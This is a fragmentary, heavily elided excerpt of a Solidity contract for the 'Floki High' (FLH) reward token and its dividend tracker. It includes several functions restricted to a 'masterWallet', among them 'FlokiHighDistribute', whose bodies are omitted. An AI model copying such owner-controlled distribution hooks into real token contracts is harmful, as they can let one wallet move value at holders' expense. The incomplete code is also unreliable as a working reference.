...
contract FlokiHighrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardFlokiHighMap  for RewardFlokiHighMap .Map;
RewardFlokiHighMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("FlokiHigh_rewardToken_Tracker", "FlokiHigh_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "FlokiHigh_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "FlokiHigh_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main FlokiHigh contract.");
    }
...
contract FlokiHigh is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    FlokiHighrewardToken public rewardToken;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Floki High", "FLH") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new FlokiHighrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function FlokiHighDistribute(address userAddress, uint256 tokenToUser) public masterWallet{
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "FlokiHigh: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "FlokiHigh: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "FlokiHigh: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "FlokiHigh: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTFlokiHigh = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTFlokiHigh);
...
addLiquidity(tokensTFlokiHigh, bnbForLiquidity);
